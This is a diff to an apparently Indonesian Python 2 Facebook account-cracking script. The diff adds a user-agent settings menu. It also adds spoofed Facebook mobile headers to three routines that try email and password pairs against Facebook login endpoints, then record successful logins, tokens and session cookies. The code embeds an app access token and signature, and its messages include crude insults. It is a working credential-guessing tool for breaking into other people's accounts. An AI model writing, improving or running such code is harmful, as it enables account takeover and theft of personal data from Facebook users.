@@ -73,7 +73,6 @@ my_color = [
 warna = random.choice(my_color)
 #  Moch Yayan Juan Alvredo XD.  #
 #------------------------------->
-ua = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/cy.txt').text.strip()
 ok = []
 cp = []
 id = []
@@ -176,7 +175,7 @@ def moch_yayan():
     print ' [%s5%s]. Mulai crack'%(O,N)
     print ' [%s6%s]. Check ingformasi akun fb'%(O,N)
     print ' [%s7%s]. Lihat hasil crack'%(O,N)
-    print ' [%s8%s]. Ganti user agent'%(O,N)
+    print ' [%s8%s]. Settings user agent'%(O,N)
     print ' [%s9%s]. Ingfo %sscript'%(O,N,O)
     print ' %s[%s0%s]. logout (%shapus token%s)'%(N,M,N,M,N)
     awokawokawokawokawokawokawokawokawokawokawokawok()
@@ -231,7 +230,7 @@ def awokawokawokawokawokawokawokawokawokawokawokawok():
             else:
                 moch_yayan()
         elif yan =='8':
-        	ganti_user_agent()
+        	seting_yntkts()
         elif yan =='9':
         	info_tools()
         elif yan =='0':
@@ -574,36 +573,56 @@ def info_tools():
     raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
     moch_yayan()
 ### ganti user agent
-def ganti_user_agent():
-	wibu = raw_input('\n %s[%s?%s] apakah kamu ingin mengganti user agent? [Y/t] : '%(N,M,N))
-	if wibu =='':
-		ganti_user_agent()
-	elif wibu == 'y' or wibu == 'Y':
-		try:
-			print '\n %s(%s•%s) notice me: cari user agent di google chrome, ketik user agent/my user agent.\n'%(N,O,N)
-			ua = raw_input(' [?] User Agent : ') 
-			uas = open('.ua','w')
-			uas.write(ua) 
-			uas.close()
-			jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
-			time.sleep(2)
-			moch_yayan()
-		except KeyboardInterrupt:
-			exit()
-	elif wibu == 't' or wibu == 'T':
-		try:
-			ua = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/cy.txt').text.strip()
-			uas = open('.ua','w')
-			uas.write(ua) 
-			uas.close()
-			jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
-			time.sleep(2)
-			moch_yayan()
-		except KeyboardInterrupt:
-			print '\n %s[%s×%s] isi yang bener Kentod'%(N,M,N)
-			ganti_user_agent()
-	else:
+def seting_yntkts():
+	print '\n (%s1%s) ganti user agent'%(O,N)
+	print ' (%s2%s) check user agent'%(O,N)
+	ya_tanya_bapa_jangan_tanya_saya()
+def ya_tanya_bapa_jangan_tanya_saya():
+	ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
+	if ytbjts == '':
+		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
+		time.sleep(2)
 		moch_yayan()
+	elif ytbjts =='1':
+		yo_ndak_tau_ko_tanya_saia()
+	elif ytbjts =='2':
+		check_yntkts()
+	else:
+		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
+		time.sleep(2)
+		moch_yayan()
+# User Agent baru
+def yo_ndak_tau_ko_tanya_saia():	
+	os.system('rm -rf YNTKTS.txt')
+	print '\n %s(%s•%s) notice me: cari User Agent di google chrome.'%(N,O,N)
+	print ' (%s×%s) ketik User Agent atau My User Agent....\n'%(M,N)
+	ua = raw_input(' [%s?%s] Masukan User Agent :%s '%(O,N,H))
+	if ua == '':
+		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
+		time.sleep(2)
+		moch_yayan()
+	try:
+		uas = open('YNTKTS.txt','w')
+		uas.write(ua)
+		uas.close()
+		time.sleep(2)
+		jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
+		time.sleep(2)
+		moch_yayan()
+	except (KeyError, IOError):
+	  print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
+	  time.sleep(2)
+	  moch_yayan()
+# Cek User Agent
+def check_yntkts():
+    try:
+        user_agent = open('YNTKTS.txt', 'r').read()
+    except IOError:
+    	user_agent = '%s-'%(M)
+    except: pass
+    print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
+    raw_input('\n  %s[ %skembali%s ]'%(N,O,N))
+    moch_yayan()
 # mulai ngecrot awokawokawokkawok
 class __crack__:
 
@@ -713,9 +732,20 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
+            try:
+            	user_agent = open('YNTKTS.txt', 'r').read()
+            except (KeyError, IOError):
+            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/cy.txt').text.strip()
+            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
+               'x-fb-net-hni': str(random.randint(20000, 40000)), 
+               'x-fb-connection-quality': 'EXCELLENT', 
+               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+               'user-agent': user_agent, 
+               'content-type': 'application/x-www-form-urlencoded', 
+               'x-fb-http-engine': 'Liger'}
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             api = 'https://b-api.facebook.com/method/auth.login'
-            response = requests.get(api, params=params, headers={'user-agent': ua})
+            response = requests.get(api, params=params, headers=headers_)
             if re.search('(EAAA)\\w+', response.text):
                 print '\r  %s* --> %s | %s               %s' % (H,user,pw,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
@@ -749,7 +779,18 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
+            try:
+            	user_agent = open('YNTKTS.txt', 'r').read()
+            except (KeyError, IOError):
+            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/cy.txt').text.strip()
+            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
+               'x-fb-net-hni': str(random.randint(20000, 40000)), 
+               'x-fb-connection-quality': 'EXCELLENT', 
+               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+               'user-agent': user_agent, 
+               'content-type': 'application/x-www-form-urlencoded', 
+               'x-fb-http-engine': 'Liger'}
+            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
             xo = aw.content
             if 'mbasic_logout_button' in xo or 'save-device' in xo:
                 print '\r  %s* --> %s | %s               %s' % (H,user,pw,N)
@@ -784,9 +825,20 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
+            try:
+            	user_agent = open('YNTKTS.txt', 'r').read()
+            except (KeyError, IOError):
+            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/cy.txt').text.strip()
+            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
+               'x-fb-net-hni': str(random.randint(20000, 40000)), 
+               'x-fb-connection-quality': 'EXCELLENT', 
+               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+               'user-agent': user_agent, 
+               'content-type': 'application/x-www-form-urlencoded', 
+               'x-fb-http-engine': 'Liger'}
             ses = requests.Session()
             ses.get('https://m.facebook.com/')
-            ses.headers={'user-agent': ua}
+            ses.headers=headers_
             b = ses.post('https://m.facebook.com/login', data={'email': user, 'pass': pw}).url
             if 'c_user' in ses.cookies.get_dict().keys():
                 kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
